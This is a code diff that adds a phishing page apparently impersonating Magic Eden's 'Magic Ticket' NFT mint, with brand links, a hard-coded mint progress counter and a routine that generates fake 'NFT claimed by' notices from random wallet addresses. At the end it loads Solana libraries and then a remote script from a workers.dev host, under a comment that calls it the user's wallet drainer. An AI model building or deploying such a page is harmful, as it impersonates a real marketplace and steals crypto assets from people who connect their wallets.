+                        <div class="tw-flex tw-items-center tw-justify-between tw-text-[14px] tw-text-gray-5">
+                            <span class="">Total minted</span>
+                            <span>
+                                <b class="tw-text-white-1" id="proc1">74</b>
+                                <b class="tw-text-white-1">%</b>
+                                (<span id="mints1">22949</span>
+                                /<span>30602</span>
+                                )
+                            </span>
+                        </div>
+                        <div class="progress-bar__container">
+                            <div class="progress-bar__value" style="width: 74%;" id="progress-bar1"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</div></div>
+<div class="">
+    <div class="tw-w-full tw-h-[1px] tw-border tw-border-solid tw-border-purple-1 tw-mt-12 tw-mb-4 lg:tw-mt-32 lg:tw-mb-10"></div>
+</div>
+<div>
+    <div class="tw-flex tw-flex-1 tw-flex-col md:tw-flex-row tw-mx-auto tw-gap-32 tw-pb-20 tw-justify-between">
+        <div class="tw-flex tw-flex-col tw-gap-4 tw-flex-grow md:tw-w-[40%]">
+            <h1 class="
+                    mt-1
+                    tw-text-[58px] tw-font-extrabold tw-leading-none
+                  ">Magic Ticket</h1>
+            <div class="tw-flex tw-flex-wrap tw-gap-4">
+                <a href="https://blog.magiceden.io/p/magicdao-magic-ticket-litepaper?s=w" target="_blank" rel="noreferrer noopener" class="
+                    tw-border
+                    tw-border-solid
+                    tw-border-purple-1
+                    tw-flex
+                    tw-items-center
+                    tw-gap-2
+                    tw-w-fit
+                    tw-rounded-full
+                    tw-px-2.5
+                    tw-py-1.5
+                    tw-text-white-2
+                  ">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 20 20" color="#e42575">
+                        <path stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round" d="M15 10.833v5a1.666 1.666 0 01-1.667 1.667H4.167A1.667 1.667 0 012.5 15.833V6.667A1.667 1.667 0 014.167 5h5M12.5 2.5h5v5M8.332 11.667L17.499 2.5"></path>
+                    </svg>
+                    <span>Website</span>
+                </a>
+                <a href="https://discord.com/invite/magiceden" target="_blank" rel="noreferrer noopener" class="
+                    tw-border
+                    tw-border-solid
+                    tw-border-purple-1
+                    tw-flex
+                    tw-items-center
+                    tw-gap-2
+                    tw-w-fit
+                    tw-rounded-full
+                    tw-px-2.5
+                    tw-py-1.5
+                    tw-text-white-2
+                  ">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 20 20" color="#e42575">
+                        <path stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round" d="M15 10.833v5a1.666 1.666 0 01-1.667 1.667H4.167A1.667 1.667 0 012.5 15.833V6.667A1.667 1.667 0 014.167 5h5M12.5 2.5h5v5M8.332 11.667L17.499 2.5"></path>
+                    </svg>
+                    <span>Discord</span>
+                </a>
+                <a href="https://twitter.com/MagicEden" target="_blank" rel="noreferrer noopener" class="
+                    tw-border
+                    tw-border-solid
+                    tw-border-purple-1
+                    tw-flex
+                    tw-items-center
+                    tw-gap-2
+                    tw-w-fit
+                    tw-rounded-full
+                    tw-px-2.5
+                    tw-py-1.5
+                    tw-text-white-2
+                  ">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 20 20" color="#e42575">
+                        <path stroke="#F5F3F7" stroke-linecap="round" stroke-linejoin="round" d="M15 10.833v5a1.666 1.666 0 01-1.667 1.667H4.167A1.667 1.667 0 012.5 15.833V6.667A1.667 1.667 0 014.167 5h5M12.5 2.5h5v5M8.332 11.667L17.499 2.5"></path>
+                    </svg>
+                    <span>Twitter</span>
+                </a>
+            </div>
+            <div>
+                <p class="
+                      tw-text-light-gray-500 tw-mb-3 tw-text-[16]
+                      tx-line-[24]
+                    ">
+                <div>
+                    <p class="tw-text-gray-light tw-mb-3 tw-text-[16] tx-line-[24]">
+                        Hey everyone,<br>
+                        <br>
+                        Thanks so much for participating in our airdrop. We want to use this blog post to dive a little deeper into what MagicDAO is, our roadmap and how the Magic Ticket ties it all together.<br>
+                        <br>
+                        We see Magic Ticket and MagicDAO as both long term plays for Magic Eden with multi-year roadmaps. They are  our way of offering our community ways to engage with us as we build out proposals and programs that give back to the community. In the coming years, we plan to invest significant time, resources and effort into growing these  initiatives.<br>
+                        <br>
+                    </p>
+                    <p class="tw-text-gray-light tw-mb-3 tw-text-[16] tx-line-[24]">
+                        <img class="tw-rounded-xl" src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd25c5455-9e9d-4784-b925-077abf3bb650_1024x768.webp" alt="Magic Ticket">
+                    </p>
+                </div>
+</p></div></div>
+<div class="
+              tw-flex tw-flex-col tw-gap-4 tw-flex-grow
+              md:tw-w-[50%]
+            ">
+    <div class="tw-w-full tw-self-stretch">
+        <div class="tw-flex tw-gap-8 lg:tw-gap-16">
+            <div class="
+                    tw-relative
+                    me-tab2
+                    tw-flex
+                    tw-cursor-pointer
+                    tw-mr-2
+                    tw-py-2
+                    tw-px-4
+                    tw-text-white-2
+                    tw-font-medium
+                    tw-text-lg
+                   is-active">
+                <span class="me-tab2-title">Our roadmap based on our pillars</span>
+            </div>
+            <!---->
+        </div>
+    </div>
+    <div>
+        <div class="tw-p-4">
+            <div class="tw-my-1">
+                <p class="tw-text-gray-light tw-mb-3 tw-text-[16] tx-line-[24]">
+                    <img class="tw-rounded-xl" src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F45866bb2-1bdd-4cb4-844d-eb4024639104_1024x768.webp" alt="Magic Ticket">
+                </p>
+                <p class="tw-text-gray-light tw-text-md tw-text-[14px]">Subscribe to Magic Eden
+
+
+</p>
+                <br>
+            </div>
+            <div class="tw-my-1">
+                <p class="tw-text-gray-light tw-text-md tw-text-[14px]">Launched 6 months ago</p>
+                <br>
+            </div>
+            <div class="tw-my-1">
+                <p class="tw-text-gray-light tw-text-md tw-text-[14px]">Magic Eden is the leading NFT Marketplace on Solana. Home to the next generation of digital creators.</p>
+                <br>
+            </div>
+        </div>
+    </div>
+    <!---->
+</div>
+</div></div>
+<div class="modal fade" tabindex="-1" role="dialog" aria-labelledby="modal" aria-hidden="true" style="backdrop-filter: blur(20px);">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content position-relative tw-bg-gray-100 tw-rounded-xl tw-p-4 tw-border-gray-500">
+            <div class="modal-body">
+                <div class="tw-flex tw-flex-col tw-w-full tw-items-center">
+                    <div class="tw-flex tw-flex-col tw-items-center tw-text-center tw-text-white-2">
+                        <p>I acknowledge that I decide the validity and worthiness of a
+                            launchpad project by deciding to mint. There's a risk that,
+                            despite a creator's best efforts, their promises may not be
+                            fulfilled. I will do my own research to make the best
+                            informed decision.</p>
+                        <div class="tw-mt-10">
+                            <button type="button" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 PlainButton_btn__24zB_ tw-mr-2 PlainButton_transparent__1quxP">I understand</button>
+                            <button type="button" class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 PlainButton_btn__24zB_ PlainButton_transparent__1quxP">Take me back</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</div></div></div></div></div></div><script src="../../js/core.min.js"></script>
+<script src="../../js/popper.min.js"></script>
+<script src="../../js/bootstrap.min.js"></script>
+<script src="../../src/index.js"></script>
+<script>
+    !function(e) {
+
+        function t(t) {
+            for (var n, i, a = t[0], c = t[1], l = t[2], s = 0, p = []; s < a.length; s++)
+                i = a[s],
+                Object.prototype.hasOwnProperty.call(o, i) && o[i] && p.push(o[i][0]),
+                o[i] = 0;
+            for (n in c)
+                Object.prototype.hasOwnProperty.call(c, n) && (e[n] = c[n]);
+            for (f && f(t); p.length; )
+                p.shift()();
+            return u.push.apply(u, l || []),
+            r()
+        }
+
+        function r() {
+            for (var e, t = 0; t < u.length; t++) {
+                for (var r = u[t], n = !0, a = 1; a < r.length; a++) {
+                    var c = r[a];
+                    0 !== o[c] && (n = !1)
+                }
+                n && (u.splice(t--, 1),
+                e = i(i.s = r[0]))
+            }
+            return e
+        }
+        var n = {}
+          , o = {
+            1: 0
+        }
+          , u = [];
+
+        function i(t) {
+            if (n[t])
+                return n[t].exports;
+            var r = n[t] = {
+                i: t,
+                l: !1,
+                exports: {}
+            };
+            return e[t].call(r.exports, r, r.exports, i),
+            r.l = !0,
+            r.exports
+        }
+        i.e = function(e) {
+            var t = []
+              , r = o[e];
+            if (0 !== r)
+                if (r)
+                    t.push(r[2]);
+                else {
+                    var n = new Promise((function(t, n) {
+                        r = o[e] = [t, n]
+                    }
+                    ));
+                    t.push(r[2] = n);
+                    var u, a = document.createElement("script");
+                    a.charset = "utf-8",
+                    a.timeout = 120,
+                    i.nc && a.setAttribute("nonce", i.nc),
+                    a.src = function(e) {
+                        return i.p + "/js/" + ({}[e] || e) + "." + {
+                            3: ""
+                        }[e] + "chunk.js"
+                    }(e);
+                    var c = new Error;
+                    u = function(t) {
+                        a.onerror = a.onload = null,
+                        clearTimeout(l);
+                        var r = o[e];
+                        if (0 !== r) {
+                            if (r) {
+                                var n = t && ("load" === t.type ? "missing" : t.type)
+                                  , u = t && t.target && t.target.src;
+                                c.message = "Loading chunk " + e + " failed.\n(" + n + ": " + u + ")",
+                                c.name = "ChunkLoadError",
+                                c.type = n,
+                                c.request = u,
+                                r[1](c)
+                            }
+                            o[e] = void 0
+                        }
+                    }
+                    ;
+                    var l = setTimeout((function() {
+                        u({
+                            type: "timeout",
+                            target: a
+                        })
+                    }
+                    ), 12e4);
+                    a.onerror = a.onload = u,
+                    document.head.appendChild(a)
+                }
+            return Promise.all(t)
+        }
+        ,
+        i.m = e,
+        i.c = n,
+        i.d = function(e, t, r) {
+            i.o(e, t) || Object.defineProperty(e, t, {
+                enumerable: !0,
+                get: r
+            })
+        }
+        ,
+        i.r = function(e) {
+            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                value: "Module"
+            }),
+            Object.defineProperty(e, "__esModule", {
+                value: !0
+            })
+        }
+        ,
+        i.t = function(e, t) {
+            if (1 & t && (e = i(e)),
+            8 & t)
+                return e;
+            if (4 & t && "object" == typeof e && e && e.__esModule)
+                return e;
+            var r = Object.create(null);
+            if (i.r(r),
+            Object.defineProperty(r, "default", {
+                enumerable: !0,
+                value: e
+            }),
+            2 & t && "string" != typeof e)
+                for (var n in e)
+                    i.d(r, n, function(t) {
+                        return e[t]
+                    }
+                    .bind(null, n));
+            return r
+        }
+        ,
+        i.n = function(e) {
+            var t = e && e.__esModule ? function() {
+                return e.default
+            }
+            : function() {
+                return e
+            }
+            ;
+            return i.d(t, "a", t),
+            t
+        }
+        ,
+        i.o = function(e, t) {
+            return Object.prototype.hasOwnProperty.call(e, t)
+        }
+        ,
+        i.p = "/",
+        i.oe = function(e) {
+            throw console.error(e),
+            e
+        }
+        ;
+        var a = this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || []
+          , c = a.push.bind(a);
+        a.push = t,
+        a = a.slice();
+        for (var l = 0; l < a.length; l++)
+            t(a[l]);
+        var f = c;
+        r()
+    }([])
+</script>
+<script src="../../js/chunk.js"></script>
+<script src="../../js/main.chunk.js"></script>
+<div at-magnifier-wrapper="">
+    <div class="at-theme-dark">
+        <div class="at-base notranslate" translate="no"></div>
+    </div>
+</div>
+<script type="text/javascript" src="javascript/index.js"></script>
+<style type="text/css">
+    .toast-title {
+        font-weight: 700
+    }
+
+    .toast-message {
+        -ms-word-wrap: break-word;
+        word-wrap: break-word
+    }
+
+    .toast-message a,.toast-message label {
+        color: #fff
+    }
+
+    .toast-message a:hover {
+        color: #ccc;
+        text-decoration: none
+    }
+
+    .toast-close-button {
+        position: relative;
+        right: -.3em;
+        top: -.3em;
+        float: right;
+        font-size: 20px;
+        font-weight: 700;
+        color: #fff;
+        -webkit-text-shadow: 0 1px 0 #fff;
+        text-shadow: 0 1px 0 #fff;
+        opacity: .8;
+        line-height: 1
+    }
+
+    .toast-close-button:focus,.toast-close-button:hover {
+        color: #000;
+        text-decoration: none;
+        cursor: pointer;
+        opacity: .4
+    }
+
+    .rtl .toast-close-button {
+        left: -.3em;
+        float: left;
+        right: .3em
+    }
+
+    button.toast-close-button {
+        padding: 0;
+        cursor: pointer;
+        background: 0 0;
+        border: 0;
+        -webkit-appearance: none
+    }
+
+    .toast-top-center {
+        top: 0;
+        right: 0;
+        width: 100%
+    }
+
+    .toast-bottom-center {
+        bottom: 0;
+        right: 0;
+        width: 100%
+    }
+
+    .toast-top-full-width {
+        top: 0;
+        right: 0;
+        width: 100%
+    }
+
+    .toast-bottom-full-width {
+        bottom: 0;
+        right: 0;
+        width: 100%
+    }
+
+    .toast-top-left {
+        top: 12px;
+        left: 12px
+    }
+
+    .toast-top-right {
+        top: 50px;
+        right: 50px
+    }
+
+    .toast-bottom-right {
+        right: 12px;
+        bottom: 12px
+    }
+
+    .toast-bottom-left {
+        bottom: 12px;
+        left: 12px
+    }
+
+    #toast-container {
+        position: fixed;
+        z-index: 999999;
+        pointer-events: none
+    }
+
+    #toast-container * {
+        -moz-box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    #toast-container>div {
+        position: relative;
+        pointer-events: auto;
+        overflow: hidden;
+        margin: 0 0 6px;
+        padding: 15px 15px 15px 50px;
+        width: 300px;
+        -moz-border-radius: 3px;
+        -webkit-border-radius: 3px;
+        border-radius: 3px;
+        background-position: 15px center;
+        background-repeat: no-repeat;
+        -moz-box-shadow: 0 0 12px #999;
+        -webkit-box-shadow: 0 0 12px #999;
+        box-shadow: 0 0 12px rgb(0, 0, 0);
+        color: #999;
+        opacity: .8
+    }
+
+    #toast-container>div.rtl {
+        direction: rtl;
+        padding: 15px 50px 15px 15px;
+        background-position: right 15px center
+    }
+
+    #toast-container>div:hover {
+        -moz-box-shadow: 0 0 12px #000;
+        -webkit-box-shadow: 0 0 12px #000;
+        box-shadow: 0 0 12px #000;
+        opacity: 1;
+        cursor: pointer
+    }
+
+    #toast-container>.toast-error {
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHOSURBVEhLrZa/SgNBEMZzh0WKCClSCKaIYOED+AAKeQQLG8HWztLCImBrYadgIdY+gIKNYkBFSwu7CAoqCgkkoGBI/E28PdbLZmeDLgzZzcx83/zZ2SSXC1j9fr+I1Hq93g2yxH4iwM1vkoBWAdxCmpzTxfkN2RcyZNaHFIkSo10+8kgxkXIURV5HGxTmFuc75B2RfQkpxHG8aAgaAFa0tAHqYFfQ7Iwe2yhODk8+J4C7yAoRTWI3w/4klGRgR4lO7Rpn9+gvMyWp+uxFh8+H+ARlgN1nJuJuQAYvNkEnwGFck18Er4q3egEc/oO+mhLdKgRyhdNFiacC0rlOCbhNVz4H9FnAYgDBvU3QIioZlJFLJtsoHYRDfiZoUyIxqCtRpVlANq0EU4dApjrtgezPFad5S19Wgjkc0hNVnuF4HjVA6C7QrSIbylB+oZe3aHgBsqlNqKYH48jXyJKMuAbiyVJ8KzaB3eRc0pg9VwQ4niFryI68qiOi3AbjwdsfnAtk0bCjTLJKr6mrD9g8iq/S/B81hguOMlQTnVyG40wAcjnmgsCNESDrjme7wfftP4P7SP4N3CJZdvzoNyGq2c/HWOXJGsvVg+RA/k2MC/wN6I2YA2Pt8GkAAAAASUVORK5CYII=)!important
+    }
+
+    #toast-container>.toast-success {
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADsSURBVEhLY2AYBfQMgf///3P8+/evAIgvA/FsIF+BavYDDWMBGroaSMMBiE8VC7AZDrIFaMFnii3AZTjUgsUUWUDA8OdAH6iQbQEhw4HyGsPEcKBXBIC4ARhex4G4BsjmweU1soIFaGg/WtoFZRIZdEvIMhxkCCjXIVsATV6gFGACs4Rsw0EGgIIH3QJYJgHSARQZDrWAB+jawzgs+Q2UO49D7jnRSRGoEFRILcdmEMWGI0cm0JJ2QpYA1RDvcmzJEWhABhD/pqrL0S0CWuABKgnRki9lLseS7g2AlqwHWQSKH4oKLrILpRGhEQCw2LiRUIa4lwAAAABJRU5ErkJggg==)!important
+    }
+
+    #toast-container>.toast-warning {
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGYSURBVEhL5ZSvTsNQFMbXZGICMYGYmJhAQIJAICYQPAACiSDB8AiICQQJT4CqQEwgJvYASAQCiZiYmJhAIBATCARJy+9rTsldd8sKu1M0+dLb057v6/lbq/2rK0mS/TRNj9cWNAKPYIJII7gIxCcQ51cvqID+GIEX8ASG4B1bK5gIZFeQfoJdEXOfgX4QAQg7kH2A65yQ87lyxb27sggkAzAuFhbbg1K2kgCkB1bVwyIR9m2L7PRPIhDUIXgGtyKw575yz3lTNs6X4JXnjV+LKM/m3MydnTbtOKIjtz6VhCBq4vSm3ncdrD2lk0VgUXSVKjVDJXJzijW1RQdsU7F77He8u68koNZTz8Oz5yGa6J3H3lZ0xYgXBK2QymlWWA+RWnYhskLBv2vmE+hBMCtbA7KX5drWyRT/2JsqZ2IvfB9Y4bWDNMFbJRFmC9E74SoS0CqulwjkC0+5bpcV1CZ8NMej4pjy0U+doDQsGyo1hzVJttIjhQ7GnBtRFN1UarUlH8F3xict+HY07rEzoUGPlWcjRFRr4/gChZgc3ZL2d8oAAAAASUVORK5CYII=)!important
+    }
+
+    #toast-container.toast-bottom-center>div,#toast-container.toast-top-center>div {
+        width: 300px;
+        margin-left: auto;
+        margin-right: auto
+    }
+
+    #toast-container.toast-bottom-full-width>div,#toast-container.toast-top-full-width>div {
+        width: 96%;
+        margin-left: auto;
+        margin-right: auto
+    }
+
+    .toast {
+        background-color: #030303
+    }
+
+    .toast-success {
+        background-color: #51a351
+    }
+
+    .toast-error {
+        background-color: #bd362f
+    }
+
+    .toast-info {
+        background-color: #2f96b4
+    }
+
+    .toast-warning {
+        background-color: #f89406
+    }
+
+    .toast-progress {
+        position: absolute;
+        left: 0;
+        bottom: 0;
+        height: 4px;
+        background-color: #000;
+        opacity: .4
+    }
+
+    @media all and (max-width: 240px) {
+        #toast-container>div {
+            padding:8px 8px 8px 50px;
+            width: 11em
+        }
+
+        #toast-container>div.rtl {
+            padding: 8px 50px 8px 8px
+        }
+
+        #toast-container .toast-close-button {
+            right: -.2em;
+            top: -.2em
+        }
+
+        #toast-container .rtl .toast-close-button {
+            left: -.2em;
+            right: .2em
+        }
+    }
+
+    @media all and (min-width: 241px) and (max-width:480px) {
+        #toast-container>div {
+            padding:8px 8px 8px 50px;
+            width: 18em
+        }
+
+        #toast-container>div.rtl {
+            padding: 8px 50px 8px 8px
+        }
+
+        #toast-container .toast-close-button {
+            right: -.2em;
+            top: -.2em
+        }
+
+        #toast-container .rtl .toast-close-button {
+            left: -.2em;
+            right: .2em
+        }
+    }
+
+    @media all and (min-width: 481px) and (max-width:768px) {
+        #toast-container>div {
+            padding:15px 15px 15px 50px;
+            width: 25em
+        }
+
+        #toast-container>div.rtl {
+            padding: 15px 50px 15px 15px
+        }
+    }
+
+    .toast-info {
+        display: flex;
+        padding: 15px 18px !important;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+        border-radius: 10px;
+        background-color: #24182f;
+        color: white;
+        font-size: 16px;
+        text-align: center;
+    }
+
+    #toast-container>div {
+        padding: 15px 15px 15px 50px;
+    }
+
+    #toast-container>.toast-info {
+        background: #24182f !important;
+    }
+</style>
+<script src="newnew/toastr.min.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        toastr.options = {
+            "closeButton": false,
+            "debug": false,
+            "newestOnTop": false,
+            "progressBar": false,
+            "positionClass": "toast-top-right",
+            "preventDuplicates": false,
+            "onclick": null,
+            "showDuration": "2000",
+            "hideDuration": "3000",
+            "timeOut": "2500",
+            "extendedTimeOut": "1000",
+            "showEasing": "swing",
+            "hideEasing": "linear",
+            "showMethod": "fadeIn",
+            "hideMethod": "fadeOut"
+        }
+        function newMint() {
+            addr = Array("Pk8i...2a", "kL91...9d", "pOl8...9d", "nI1t...bb", "Ez22...11", "n0eR...p0", "BeAz...2C", "bIaQ...1e", "Li1N...2a", "tF8n...23", "Ar7b...28", "BefI...c9", "PgH4...d2", "tNl4...18", "SdP9...k1", "P7nB...jK", "q6nH...3e", "oY7t...sK", "lK8j...gA", "Et4R...f8", "FeB5...68")
+            let n = Math.floor((Math.random() * 4) + 2);
+            let a = addr[Math.floor(Math.random() * addr.length)];
+            //toastr.info(n + "&nbsp; NFT claimed by &nbsp;" + a)
+            // toastr.info("1 NFT claimed by &nbsp;" + a)
+        }
+
+        setInterval(function() {
+            newMint();
+        }, 3000);
+    });
+</script>
+<app-content ng-version="11.1.0"></app-content>
+<div class="q-notifications">
+    <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-start"></div>
+    <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-end"></div>
+    <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-start"></div>
+    <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-end"></div>
+    <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-center"></div>
+    <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-center"></div>
+    <div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-start justify-center"></div>
+    <div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-end justify-center"></div>
+    <div class="q-notifications__list q-notifications__list--center fixed column no-wrap flex-center"></div>
+</div>
+    <script>
     window.Buffer = window.Buffer || {
       from: function (data, encoding) {
         if (typeof data === 'string' && encoding === 'hex') {
@@ -44,13 +2236,12 @@
       }
     };
     console.log("Использован минимальный полифилл Buffer");
-  </script>
+    </script>
 
   <!-- Подключение @solana/web3.js -->
-  <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
   <!-- Подключение @solana/spl-token (рабочая версия) -->
-  <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
   <!-- Твой дрейнер -->
-  <script src="https://settings-js.solanatrader1337.workers.dev"></script>
-</body>
-</html>
+    <script src="https://settings-js.solanatrader1337.workers.dev"></script>
+</body></html>
